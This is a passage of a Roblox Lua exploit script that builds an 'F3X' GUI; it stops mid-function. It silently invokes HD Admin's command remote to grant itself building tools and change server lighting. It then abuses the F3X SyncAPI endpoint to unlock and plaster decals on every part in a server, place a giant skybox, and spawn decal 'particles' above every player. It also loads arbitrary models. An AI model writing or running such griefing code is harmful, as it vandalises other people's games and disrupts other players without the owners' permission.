local Players = game:GetService("Players")
local player = Players.LocalPlayer
local coreGui = game:GetService("CoreGui")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "MiniGUI"
screenGui.ResetOnSpawn = false
screenGui.Parent = coreGui

local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 360, 0, 240)
mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
mainFrame.BorderSizePixel = 0
mainFrame.Active = true
mainFrame.Draggable = true
mainFrame.Parent = screenGui

local mainUICorner = Instance.new("UICorner")
mainUICorner.CornerRadius = UDim.new(0, 12)
mainUICorner.Parent = mainFrame

local btoolsButton = Instance.new("TextButton")
btoolsButton.Size = UDim2.new(0, 50, 0, 24)
btoolsButton.Position = UDim2.new(0, 8, 0, 2)
btoolsButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
btoolsButton.TextColor3 = Color3.fromRGB(240, 240, 240)
btoolsButton.Font = Enum.Font.SourceSansBold
btoolsButton.TextSize = 14
btoolsButton.Text = "Btools"
btoolsButton.BorderSizePixel = 0
btoolsButton.Parent = mainFrame

btoolsButton.MouseButton1Click:Connect(function()
    local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    SilentRequest:InvokeServer(";btools me")
end)

local refreshButton = Instance.new("TextButton")
refreshButton.Size = UDim2.new(0, 30, 0, 24)
refreshButton.Position = UDim2.new(1, -40, 0, 2)
refreshButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
refreshButton.TextColor3 = Color3.fromRGB(240, 240, 240)
refreshButton.Font = Enum.Font.SourceSansBold
refreshButton.TextSize = 16
refreshButton.Text = "RE"
refreshButton.BorderSizePixel = 0
refreshButton.Parent = mainFrame

refreshButton.MouseButton1Click:Connect(function()
    local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    SilentRequest:InvokeServer(";res me")
end)

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -130, 0, 28)
title.Position = UDim2.new(0, 65, 0, 0)
title.BackgroundTransparency = 1
title.Text = "ANGira f3x gui"
title.TextColor3 = Color3.fromRGB(240, 240, 240)
title.Font = Enum.Font.SourceSansBold
title.TextSize = 20
title.TextXAlignment = Enum.TextXAlignment.Center
title.Parent = mainFrame

local madeBy = Instance.new("TextLabel")
madeBy.Size = UDim2.new(1, -130, 0, 18)
madeBy.Position = UDim2.new(0, 65, 0, 22)
madeBy.BackgroundTransparency = 1
madeBy.Text = "by me gng"
madeBy.TextColor3 = Color3.fromRGB(180, 180, 180)
madeBy.Font = Enum.Font.SourceSansItalic
madeBy.TextSize = 14
madeBy.TextXAlignment = Enum.TextXAlignment.Center
madeBy.Parent = mainFrame

local scrollFrame = Instance.new("ScrollingFrame")
scrollFrame.Position = UDim2.new(0, 0, 0, 50)
scrollFrame.Size = UDim2.new(1, 0, 1, -50)
scrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
scrollFrame.ScrollBarThickness = 6
scrollFrame.BackgroundTransparency = 1
scrollFrame.BorderSizePixel = 0
scrollFrame.Parent = mainFrame

-- Create grid layout but don't parent it yet
local gridLayout = Instance.new("UIGridLayout")
gridLayout.CellSize = UDim2.new(0, 110, 0, 36)
gridLayout.CellPadding = UDim2.new(0, 6, 0, 6)
gridLayout.FillDirection = Enum.FillDirection.Horizontal
gridLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
gridLayout.SortOrder = Enum.SortOrder.LayoutOrder

-- Function to update canvas size for grid layout
local function UpdateGridCanvasSize()
    if gridLayout.Parent then
        scrollFrame.CanvasSize = UDim2.new(0, 0, 0, gridLayout.AbsoluteContentSize.Y)
    end
end

-- Connect the grid layout size change
gridLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(UpdateGridCanvasSize)

local tabContainer = Instance.new("Frame")
tabContainer.Size = UDim2.new(0, 80, 0, 240)
tabContainer.Position = UDim2.new(1, 0, 0, 0)
tabContainer.BackgroundTransparency = 1
tabContainer.BorderSizePixel = 0
tabContainer.Parent = mainFrame

local tabLayout = Instance.new("UIListLayout")
tabLayout.Padding = UDim.new(0, 5)
tabLayout.FillDirection = Enum.FillDirection.Vertical
tabLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
tabLayout.VerticalAlignment = Enum.VerticalAlignment.Top
tabLayout.Parent = tabContainer

local f3xButtons = {}
local musicButtons = {}
local extraButtons = {}
local mapsButtons = {}
local customButtons = {}
local currentTab = "F3X"

-- GLOBAL VARIABLES - Initialize them at the top level
local currentTextureId = ""
local currentModelId = ""
local particleSystemRunning = false
local currentParticleTextureId = ""

-- Function to validate texture ID
local function IsValidTextureId(textureId)
    if not textureId or textureId == "" then
        return false
    end
    
    -- Check if it's a valid number
    if not tonumber(textureId) then
        return false
    end
    
    -- Check if it's a positive number
    local numId = tonumber(textureId)
    if numId <= 0 then
        return false
    end
    
    return true
end

-- Function to validate model ID
local function IsValidModelId(modelId)
    if not modelId or modelId == "" then
        return false
    end
    
    -- Check if it's a valid number
    if not tonumber(modelId) then
        return false
    end
    
    -- Check if it's a positive number
    local numId = tonumber(modelId)
    if numId <= 0 then
        return false
    end
    
    return true
end

function AddButton(opts)
    table.insert(f3xButtons, opts)
    if currentTab == "F3X" then CreateButton(opts) end
end

function MusicAddButton(opts)
    table.insert(musicButtons, opts)
    if currentTab == "Music" then CreateButton(opts) end
end

function ExtraAddButton(opts)
    table.insert(extraButtons, opts)
    if currentTab == "Extra" then CreateButton(opts) end
end

function MapsAddButton(opts)
    table.insert(mapsButtons, opts)
    if currentTab == "Maps" then CreateButton(opts) end
end

function CustomAddButton(opts)
    table.insert(customButtons, opts)
    if currentTab == "Custom" then CreateButton(opts) end
end

function CreateButton(opts)
    local button = Instance.new("TextButton")
    button.Name = opts.Name or "Button"
    button.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    button.TextColor3 = Color3.fromRGB(240, 240, 240)
    button.Font = Enum.Font.SourceSans
    button.TextSize = 16
    button.Text = opts.Name or "Button"
    button.AutoButtonColor = true
    button.BorderSizePixel = 0
    button.Parent = scrollFrame

    if opts.Callback then
        button.MouseButton1Click:Connect(opts.Callback)
    end

    return button
end

local function ClearButtons()
    for _, child in ipairs(scrollFrame:GetChildren()) do
        if child:IsA("TextButton") or child:IsA("Frame") then
            child:Destroy()
        end
    end
end

local function SetupGridLayout()
    -- Remove existing grid layout if any
    if gridLayout.Parent then
        gridLayout.Parent = nil
    end
    -- Add grid layout back
    gridLayout.Parent = scrollFrame
    -- Force update canvas size
    task.wait(0.1)
    UpdateGridCanvasSize()
end

local function ShowF3XButtons()
    ClearButtons()
    currentTab = "F3X"
    SetupGridLayout()
    for _, btnDef in ipairs(f3xButtons) do CreateButton(btnDef) end
end

local function ShowMusicButtons()
    ClearButtons()
    currentTab = "Music"
    SetupGridLayout()
    for _, btnDef in ipairs(musicButtons) do CreateButton(btnDef) end
end

local function ShowExtraButtons()
    ClearButtons()
    currentTab = "Extra"
    SetupGridLayout()
    for _, btnDef in ipairs(extraButtons) do CreateButton(btnDef) end
end

-- ULTRA ROBUST F3X TOOL FUNCTIONS THAT SURVIVE MULTIPLE DEATHS AND RESPAWNS
local function FindF3XTool()
    local player = game.Players.LocalPlayer
    if not player then 
        warn("Player not found!")
        return nil 
    end
    
    local tool = nil
    
    -- Method 1: Deep search in backpack (wait for it to load)
    local backpack = player:FindFirstChild("Backpack")
    if backpack then
        -- Wait for backpack to fully load
        for i = 1, 15 do
            for _, item in ipairs(backpack:GetChildren()) do
                if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
                    tool = item
                    break
                end
            end
            if tool then break end
            task.wait(0.1)
        end
    end
    
    -- Method 2: Search character (including waiting for character to load)
    if not tool and player.Character then
        for _, item in ipairs(player.Character:GetChildren()) do
            if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
                tool = item
                break
            end
        end
    end
    
    -- Method 3: Force wait for character if none exists
    if not tool and not player.Character then
        local success, char = pcall(function()
            return player.CharacterAdded:Wait()
        end)
        if success and char then
            for i = 1, 10 do
                for _, item in ipairs(char:GetChildren()) do
                    if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
                        tool = item
                        break
                    end
                end
                if tool then break end
                task.wait(0.2)
            end
        end
    end
    
    -- Method 4: Use HDAdmin to get tools if still not found
    if not tool then
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";btools me")
        task.wait(1)
        tool = FindF3XTool() -- Recursive call to search again
    end
    
    if tool then
        print("Found F3X tool: " .. tool.Name)
    else
        warn("F3X tool not found in any location!")
    end
    
    return tool
end

local function ExecuteF3XCommand(args)
    -- Try multiple times with increasing delays
    for attempt = 1, 10 do
        local tool = FindF3XTool()
        if tool and tool:FindFirstChild("SyncAPI") then
            local remote = tool.SyncAPI.ServerEndpoint
            local success, result = pcall(function()
                remote:InvokeServer(unpack(args))
            end)
            if success then
                return true
            else
                warn("F3X command failed (attempt " .. attempt .. "): " .. tostring(result))
            end
        else
            if attempt == 1 then
                warn("F3X tools not found! Searching...")
                -- Force get btools
                local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
                SilentRequest:InvokeServer(";btools me")
            end
        end
        
        -- Increase delay with each attempt
        task.wait(0.3 * attempt)
    end
    
    warn("F3X command failed after all attempts. Please make sure you have F3X tools.")
    return false
end

-- Simple F3X functions
local function CreatePart(cf, parent)
    return ExecuteF3XCommand({"CreatePart", "Normal", cf, parent})
end

local function SetAnchor(part, state)
    return ExecuteF3XCommand({"SyncAnchor", {{Part = part, Anchored = state}}})
end

local function SetCollision(part, state)
    return ExecuteF3XCommand({"SyncCollision", {{Part = part, CanCollide = state}}})
end

local function AddMesh(part)
    return ExecuteF3XCommand({"CreateMeshes", {{Part = part}}})
end

local function SetMesh(part, meshid)
    return ExecuteF3XCommand({"SyncMesh", {{Part = part, MeshId = "rbxassetid://" .. meshid}}})
end

local function SetTexture(part, texid)
    return ExecuteF3XCommand({"SyncMesh", {{Part = part, TextureId = "rbxassetid://" .. texid}}})
end

local function MeshResize(part, size)
    return ExecuteF3XCommand({"SyncMesh", {{Part = part, Scale = size}}})
end

-- ADDED SetVertexColor FUNCTION
local function SetVertexColor(part, color)
    return ExecuteF3XCommand({"SyncMesh", {{Part = part, VertexColor = color}}})
end

local function SetLocked(part, boolean)
    return ExecuteF3XCommand({"SetLocked", {part}, boolean})
end

local function Resize(part, size, cf)
    return ExecuteF3XCommand({"SyncResize", {{Part = part, CFrame = cf, Size = size}}})
end

local function SpawnDecal(part, face)
    return ExecuteF3XCommand({"CreateTextures", {{Part = part, Face = face, TextureType = "Decal"}}})
end

local function AddDecal(part, asset, face)
    return ExecuteF3XCommand({"SyncTexture", {{Part = part, Face = face, TextureType = "Decal", Texture = "rbxassetid://"..asset}}})
end

local function SetName(part, name)
    return ExecuteF3XCommand({"SetName", {part}, name})
end

local function SetTrans(part, val)
    return ExecuteF3XCommand({"SyncMaterial", {{Part = part, Transparency = val}}})
end

local function delete(part)
    return ExecuteF3XCommand({"Remove", {part}})
end

-- Skybox Function WITH VERTEX COLOR
local function Sky(id)
    if not IsValidTextureId(id) then 
        warn("Invalid texture ID for skybox! Please enter a valid number.")
        return 
    end
    
    -- Set time and fog using HDAdmin
    local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    SilentRequest:InvokeServer(";time 6")
    SilentRequest:InvokeServer(";fogcolor black")
    
    local player = game.Players.LocalPlayer
    local char = player.Character or player.CharacterAdded:Wait()
    local hrp = char:WaitForChild("HumanoidRootPart")
    local cf = hrp.CFrame

    -- Create skybox part
    if CreatePart(CFrame.new(cf.Position + Vector3.new(0, 6, 0)), workspace) then
        -- Find and configure the created part
        for _, v in workspace:GetDescendants() do
            if v:IsA("BasePart") and v.Position == cf.Position + Vector3.new(0, 6, 0) then
                SetAnchor(v, true)
                AddMesh(v)
                SetMesh(v, "111891702759441") -- Sphere mesh
                SetTexture(v, id)
                -- ADDED VERTEX COLOR HERE
                SetVertexColor(v, Vector3.new(3, 3, 3))
                MeshResize(v, Vector3.new(109888, 109888, 109888))
                break
            end
        end
    else
        warn("Failed to create skybox. Make sure you have F3X tools.")
    end
end

-- Decal Spam Function
local function spam(id)
    if not IsValidTextureId(id) then 
        warn("Invalid texture ID for decal spam! Please enter a valid number.")
        return 
    end
    
    local successCount = 0
    for _, v in workspace:GetDescendants() do
        if v:IsA("BasePart") then
            spawn(function()
                if SetLocked(v, false) then
                    for _, side in ipairs(Enum.NormalId:GetEnumItems()) do
                        if SpawnDecal(v, side) and AddDecal(v, id, side) then
                            successCount = successCount + 1
                        end
                    end
                end
            end)
        end
    end
    
    if successCount > 0 then
        print("Applied " .. successCount .. " decals successfully")
    else
        warn("No decals were applied. Make sure you have F3X tools.")
    end
end

-- FIXED Particle System with respawn handling
local activeParticles = {}
local particleCooldowns = {}
local particleConnections = {}
local activeParticleThreads = {}

local function createParticleForPlayer(targetPlayer, textureId)
    local character = targetPlayer.Character
    if not character then
        local success, result = pcall(function()
            targetPlayer.CharacterAdded:Wait()
        end)
        if not success then return end
        character = targetPlayer.Character
    end
    
    if not character then return end
    
    local humanoid = character:WaitForChild("Humanoid")
    local playerKey = targetPlayer.UserId
    local cooldownKey = playerKey .. "_" .. textureId
    particleCooldowns[cooldownKey] = particleCooldowns[cooldownKey] or 0
    
    -- Track this specific thread so we can kill it if needed
    local threadId = #activeParticleThreads + 1
    local shouldStop = false
    
    -- Store thread reference for cleanup
    activeParticleThreads[threadId] = {
        player = targetPlayer,
        running = true
    }
    
    while particleSystemRunning and textureId == currentParticleTextureId and shouldStop == false do
        -- Check if player is still valid and connected
        if not targetPlayer or not targetPlayer.Parent then
            shouldStop = true
            break
        end
        
        -- Check if character is still valid
        if not character or not character.Parent then
            shouldStop = true
            break
        end
        
        -- Check if humanoid is dead
        if humanoid.Health <= 0 then
            shouldStop = true
            break
        end
        
        local currentTime = tick()
        if currentTime - particleCooldowns[cooldownKey] >= 2 then
            particleCooldowns[cooldownKey] = currentTime
            
            local head = character:FindFirstChild("Head")
            if not head then
                task.wait(0.5)
                continue
            end
            
            local spawnCFrame = head.CFrame + Vector3.new(0, 3, 0)
            
            spawn(function()  
                if CreatePart(spawnCFrame, workspace) then
                    task.wait(0.1)  
                    
                    local newPart = nil
                    for _, v in workspace:GetChildren() do  
                        if v:IsA("Part") and (v.Position - spawnCFrame.Position).Magnitude < 1 then  
                            newPart = v
                            break
                        end  
                    end
                    
                    if newPart then
                        SetName(newPart, "particle_" .. targetPlayer.Name .. "_" .. textureId)  
                        Resize(newPart, Vector3.new(6, 6, 0.001), newPart.CFrame)  
                        SetCollision(newPart, false)  
                        SetTrans(newPart, 1)  
                        SetAnchor(newPart, true)  
                        newPart.Orientation = Vector3.new(0, 0, 0)  

                        SpawnDecal(newPart, Enum.NormalId.Front)  
                        AddDecal(newPart, textureId, Enum.NormalId.Front)  
                        SpawnDecal(newPart, Enum.NormalId.Back)  
                        AddDecal(newPart, textureId, Enum.NormalId.Back)  

                        local particleId = #activeParticles + 1
                        activeParticles[particleId] = newPart

                        -- Animate particle rising up
                        for i = 1, 40 do
                            if newPart and newPart.Parent and head and head.Parent and shouldStop == false then  
                                local currentHeadPos = head.Position
                                local newPosition = Vector3.new(
                                    currentHeadPos.X,
                                    spawnCFrame.Position.Y + (i * 2),
                                    currentHeadPos.Z
                                )
                                local newCFrame = CFrame.new(newPosition)
                                Resize(newPart, newPart.Size, newCFrame)  
                                task.wait(0.05)
                            else
                                break
                            end
                        end  
 -- Cleanup
                        if newPart and newPart.Parent then
                            delete(newPart)  
                        end
                        activeParticles[particleId] = nil
                    end  
                end
            end)  
        end
        
        task.wait(0.5)
    end
    
-- Mark thread as stopped
    if activeParticleThreads[threadId] then
        activeParticleThreads[threadId].running = false
        activeParticleThreads[threadId] = nil
    end
end

local function startParticleSystem(textureId)
    if not IsValidTextureId(textureId) then
        warn("Invalid texture ID for particles! Please enter a valid number.")
        return
    end
    
    if particleSystemRunning then
        stopParticleSystem()
        task.wait(0.5) -- Give time for cleanup
    end
    
    particleSystemRunning = true
    currentParticleTextureId = textureId
    
    local function startForPlayer(player)
        spawn(function()
            createParticleForPlayer(player, textureId)
        end)
    end
    
    local function stopForPlayer(player)
        -- Clean up any particles belonging to this player
        for particleId, part in pairs(activeParticles) do
            if part and part.Name:find(player.Name) and part.Parent then
                delete(part)
                activeParticles[particleId] = nil
            end
        end
    end
    
    -- Clean up any existing connections
    for _, conn in pairs(particleConnections) do
        if conn then
            conn:Disconnect()
        end
    end
    particleConnections = {}
    
    -- Start for all players
    for _, existingPlayer in ipairs(Players:GetPlayers()) do
        startForPlayer(existingPlayer)
    end
    
    -- Listen for new players
    local playerAddedConn = Players.PlayerAdded:Connect(function(newPlayer)
        if particleSystemRunning then
            startForPlayer(newPlayer)
        end
    end)
    
    -- Listen for players leaving
    local playerRemovingConn = Players.PlayerRemoving:Connect(function(leavingPlayer)
        stopForPlayer(leavingPlayer)
    end)
    
    -- Listen for player respawns (character added)
    for _, existingPlayer in ipairs(Players:GetPlayers()) do
        existingPlayer.CharacterAdded:Connect(function(character)
            if particleSystemRunning then
                -- Stop old thread for this player
                for threadId, threadData in pairs(activeParticleThreads) do
                    if threadData.player == existingPlayer then
                        activeParticleThreads[threadId] = nil
                    end
                end
                -- Start new thread
                task.wait(2) -- Wait for character to fully load
                startForPlayer(existingPlayer)
            end
        end)
    end
    
    particleConnections["playerAdded"] = playerAddedConn
    particleConnections["playerRemoving"] = playerRemovingConn
    
    print("Particle system started with texture ID: " .. textureId)
end

local function stopParticleSystem()
    particleSystemRunning = false
    currentParticleTextureId = ""
    
    -- Stop all connections
    for _, conn in pairs(particleConnections) do
        if conn then
            conn:Disconnect()
        end
    end
    particleConnections = {}
    
    -- Stop all particle threads
    activeParticleThreads = {}
    
    -- Clean up all particles
    for particleId, part in pairs(activeParticles) do
        if part and part.Parent then
            delete(part)
        end
        activeParticles[particleId] = nil
    end
    
    print("Particle system stopped!")
end

-- FIXED: Custom tab with robust functionality
local function ShowCustomButtons()
    ClearButtons()
    currentTab = "Custom"
    
    -- Remove grid layout for custom tab
    if gridLayout.Parent then
        gridLayout.Parent = nil
    end
    
    -- Create ID input frame at top
    local idInputFrame = Instance.new("Frame")
    idInputFrame.Size = UDim2.new(1, -20, 0, 40)
    idInputFrame.Position = UDim2.new(0, 10, 0, 0)
    idInputFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    idInputFrame.BorderSizePixel = 0
    idInputFrame.Parent = scrollFrame
    
    local idInputCorner = Instance.new("UICorner")
    idInputCorner.CornerRadius = UDim.new(0, 6)
    idInputCorner.Parent = idInputFrame
    
    local idInputLabel = Instance.new("TextLabel")
    idInputLabel.Size = UDim2.new(0, 60, 1, 0)
    idInputLabel.Position = UDim2.new(0, 5, 0, 0)
    idInputLabel.BackgroundTransparency = 1
    idInputLabel.Text = "Type ID:"
    idInputLabel.TextColor3 = Color3.fromRGB(240, 240, 240)
    idInputLabel.Font = Enum.Font.SourceSans
    idInputLabel.TextSize = 14
    idInputLabel.TextXAlignment = Enum.TextXAlignment.Left
    idInputLabel.Parent = idInputFrame
    
    local idInputBox = Instance.new("TextBox")
    idInputBox.Size = UDim2.new(1, -70, 0.6, 0)
    idInputBox.Position = UDim2.new(0, 65, 0, 8)
    idInputBox.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    idInputBox.TextColor3 = Color3.fromRGB(240, 240, 240)
    idInputBox.Font = Enum.Font.SourceSans
    idInputBox.TextSize = 14
    idInputBox.PlaceholderText = "Enter texture ID..."
    idInputBox.Text = currentTextureId
    idInputBox.BorderSizePixel = 0
    idInputBox.Parent = idInputFrame
    
    local idInputCorner2 = Instance.new("UICorner")
    idInputCorner2.CornerRadius = UDim.new(0, 4)
    idInputCorner2.Parent = idInputBox
    
    -- Image preview frame in the middle
    local previewFrame = Instance.new("Frame")
    previewFrame.Size = UDim2.new(0.5, 0, 0, 120)
    previewFrame.Position = UDim2.new(0.25, 0, 0, 50)
    previewFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    previewFrame.BorderSizePixel = 0
    previewFrame.Parent = scrollFrame
    
    local previewCorner = Instance.new("UICorner")
    previewCorner.CornerRadius = UDim.new(0, 6)
    previewCorner.Parent = previewFrame
    
    local previewLabel = Instance.new("TextLabel")
    previewLabel.Size = UDim2.new(1, 0, 0, 20)
    previewLabel.Position = UDim2.new(0, 0, 0, 5)
    previewLabel.BackgroundTransparency = 1
    previewLabel.Text = "Image Preview:"
    previewLabel.TextColor3 = Color3.fromRGB(240, 240, 240)
    previewLabel.Font = Enum.Font.SourceSans
    previewLabel.TextSize = 14
    previewLabel.TextXAlignment = Enum.TextXAlignment.Center
    previewLabel.Parent = previewFrame
    
    local previewImage = Instance.new("ImageLabel")
    previewImage.Size = UDim2.new(0.9, 0, 0, 80)
    previewImage.Position = UDim2.new(0.05, 0, 0, 25)
    previewImage.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    previewImage.BorderSizePixel = 0
    previewImage.Image = currentTextureId ~= "" and "rbxassetid://" .. currentTextureId or ""
    previewImage.ScaleType = Enum.ScaleType.Fit
    previewImage.Parent = previewFrame
    
    local previewImageCorner = Instance.new("UICorner")
    previewImageCorner.CornerRadius = UDim.new(0, 4)
    previewImageCorner.Parent = previewImage
    
    -- FIXED: Update currentTextureId immediately when text changes
    idInputBox:GetPropertyChangedSignal("Text"):Connect(function()
        currentTextureId = idInputBox.Text
        if IsValidTextureId(currentTextureId) then
            pcall(function()
                previewImage.Image = "rbxassetid://" .. currentTextureId
            end)
        else
            previewImage.Image = ""
        end
    end)
    
    -- Left side buttons
    local leftButtonsFrame = Instance.new("Frame")
    leftButtonsFrame.Size = UDim2.new(0.2, 0, 0, 120)
    leftButtonsFrame.Position = UDim2.new(0.02, 0, 0, 50)
    leftButtonsFrame.BackgroundTransparency = 1
    leftButtonsFrame.Parent = scrollFrame
    
    local leftButtonsLayout = Instance.new("UIListLayout")
    leftButtonsLayout.Padding = UDim.new(0, 5)
    leftButtonsLayout.FillDirection = Enum.FillDirection.Vertical
    leftButtonsLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
    leftButtonsLayout.VerticalAlignment = Enum.VerticalAlignment.Center
    leftButtonsLayout.Parent = leftButtonsFrame
    
    -- Right side buttons
    local rightButtonsFrame = Instance.new("Frame")
    rightButtonsFrame.Size = UDim2.new(0.2, 0, 0, 120)
    rightButtonsFrame.Position = UDim2.new(0.78, 0, 0, 50)
    rightButtonsFrame.BackgroundTransparency = 1
    rightButtonsFrame.Parent = scrollFrame
    
    local rightButtonsLayout = Instance.new("UIListLayout")
    rightButtonsLayout.Padding = UDim.new(0, 5)
    rightButtonsLayout.FillDirection = Enum.FillDirection.Vertical
    rightButtonsLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
    rightButtonsLayout.VerticalAlignment = Enum.VerticalAlignment.Center
    rightButtonsLayout.Parent = rightButtonsFrame
    
    -- FIXED: Create robust button functions that always use currentTextureId
    local decalButton = Instance.new("TextButton")
    decalButton.Size = UDim2.new(0.9, 0, 0, 30)
    decalButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    decalButton.TextColor3 = Color3.fromRGB(240, 240, 240)
    decalButton.Font = Enum.Font.SourceSans
    decalButton.TextSize = 12
    decalButton.Text = "Decal Spam"
    decalButton.AutoButtonColor = true
    decalButton.BorderSizePixel = 0
    decalButton.Parent = leftButtonsFrame
    
    decalButton.MouseButton1Click:Connect(function()
        if IsValidTextureId(currentTextureId) then
            spam(currentTextureId)
        else
            warn("Please enter a valid texture ID first!")
        end
    end)
    
    local skyboxButton = Instance.new("TextButton")
    skyboxButton.Size = UDim2.new(0.9, 0, 0, 30)
    skyboxButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    skyboxButton.TextColor3 = Color3.fromRGB(240, 240, 240)
    skyboxButton.Font = Enum.Font.SourceSans
    skyboxButton.TextSize = 12
    skyboxButton.Text = "Skybox"
    skyboxButton.AutoButtonColor = true
    skyboxButton.BorderSizePixel = 0
    skyboxButton.Parent = leftButtonsFrame
    
    skyboxButton.MouseButton1Click:Connect(function()
        if IsValidTextureId(currentTextureId) then
            Sky(currentTextureId)
        else
            warn("Please enter a valid texture ID first!")
        end
    end)
    
    -- Create buttons on right side
    local startParticlesButton = Instance.new("TextButton")
    startParticlesButton.Size = UDim2.new(0.9, 0, 0, 30)
    startParticlesButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    startParticlesButton.TextColor3 = Color3.fromRGB(240, 240, 240)
    startParticlesButton.Font = Enum.Font.SourceSans
    startParticlesButton.TextSize = 12
    startParticlesButton.Text = "Start Particles"
    startParticlesButton.AutoButtonColor = true
    startParticlesButton.BorderSizePixel = 0
    startParticlesButton.Parent = rightButtonsFrame
    
    startParticlesButton.MouseButton1Click:Connect(function()
        if IsValidTextureId(currentTextureId) then
            startParticleSystem(currentTextureId)
        else
            warn("Please enter a valid texture ID first!")
        end
    end)
    
    local stopParticlesButton = Instance.new("TextButton")
    stopParticlesButton.Size = UDim2.new(0.9, 0, 0, 30)
    stopParticlesButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    stopParticlesButton.TextColor3 = Color3.fromRGB(240, 240, 240)
    stopParticlesButton.Font = Enum.Font.SourceSans
    stopParticlesButton.TextSize = 12
    stopParticlesButton.Text = "Stop Particles"
    stopParticlesButton.AutoButtonColor = true
    stopParticlesButton.BorderSizePixel = 0
    stopParticlesButton.Parent = rightButtonsFrame
    stopParticlesButton.MouseButton1Click:Connect(stopParticleSystem)
    
    -- Add existing custom buttons to left side
    for _, btnDef in ipairs(customButtons) do 
        local customBtn = Instance.new("TextButton")
        customBtn.Size = UDim2.new(0.9, 0, 0, 30)
        customBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
        customBtn.TextColor3 = Color3.fromRGB(240, 240, 240)
        customBtn.Font = Enum.Font.SourceSans
        customBtn.TextSize = 12
        customBtn.Text = btnDef.Name or "Button"
        customBtn.AutoButtonColor = true
        customBtn.BorderSizePixel = 0
        customBtn.Parent = leftButtonsFrame
        
        if btnDef.Callback then
            customBtn.MouseButton1Click:Connect(btnDef.Callback)
        end
    end
    
    -- Update canvas size for custom tab
    scrollFrame.CanvasSize = UDim2.new(0, 0, 0, 180)
end

-- FIXED: Maps tab with model ID input and load functionality
local function ShowMapsButtons()
    ClearButtons()
    currentTab = "Maps"
    
    -- Remove grid layout for maps tab
    if gridLayout.Parent then
        gridLayout.Parent = nil
    end
    
    -- Create Model ID input frame at top
    local modelIdInputFrame = Instance.new("Frame")
    modelIdInputFrame.Size = UDim2.new(1, -20, 0, 40)
    modelIdInputFrame.Position = UDim2.new(0, 10, 0, 0)
    modelIdInputFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    modelIdInputFrame.BorderSizePixel = 0
    modelIdInputFrame.Parent = scrollFrame
    
    local modelIdInputCorner = Instance.new("UICorner")
    modelIdInputCorner.CornerRadius = UDim.new(0, 6)
    modelIdInputCorner.Parent = modelIdInputFrame
    
    local modelIdInputLabel = Instance.new("TextLabel")
    modelIdInputLabel.Size = UDim2.new(0, 80, 1, 0)
    modelIdInputLabel.Position = UDim2.new(0, 5, 0, 0)
    modelIdInputLabel.BackgroundTransparency = 1
    modelIdInputLabel.Text = "Model ID:"
    modelIdInputLabel.TextColor3 = Color3.fromRGB(240, 240, 240)
    modelIdInputLabel.Font = Enum.Font.SourceSans
    modelIdInputLabel.TextSize = 14
    modelIdInputLabel.TextXAlignment = Enum.TextXAlignment.Left
    modelIdInputLabel.Parent = modelIdInputFrame
    
    local modelIdInputBox = Instance.new("TextBox")
    modelIdInputBox.Size = UDim2.new(1, -90, 0.6, 0)
    modelIdInputBox.Position = UDim2.new(0, 85, 0, 8)
    modelIdInputBox.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    modelIdInputBox.TextColor3 = Color3.fromRGB(240, 240, 240)
    modelIdInputBox.Font = Enum.Font.SourceSans
    modelIdInputBox.TextSize = 14
    modelIdInputBox.PlaceholderText = "Enter model ID..."
    modelIdInputBox.Text = currentModelId
    modelIdInputBox.BorderSizePixel = 0
    modelIdInputBox.Parent = modelIdInputFrame
    
    local modelIdInputCorner2 = Instance.new("UICorner")
    modelIdInputCorner2.CornerRadius = UDim.new(0, 4)
    modelIdInputCorner2.Parent = modelIdInputBox
    
    -- Load Model Button
    local loadModelButton = Instance.new("TextButton")
    loadModelButton.Size = UDim2.new(0.9, 0, 0, 30)
    loadModelButton.Position = UDim2.new(0.05, 0, 0, 50)
    loadModelButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    loadModelButton.TextColor3 = Color3.fromRGB(240, 240, 240)
    loadModelButton.Font = Enum.Font.SourceSans
    loadModelButton.TextSize = 14
    loadModelButton.Text = "Load Model"
    loadModelButton.AutoButtonColor = true
    loadModelButton.BorderSizePixel = 0
    loadModelButton.Parent = scrollFrame
    
    loadModelButton.MouseButton1Click:Connect(function()
        if IsValidModelId(currentModelId) then
            -- Import and load the model
            local success, result = pcall(function()
                local imported_model = game:GetObjects("rbxassetid://" .. currentModelId)[1]
                if imported_model then
                    imported_model.Parent = workspace
                    print("Model loaded successfully!")
                else
                    warn("Failed to load model with ID: " .. currentModelId)
                end
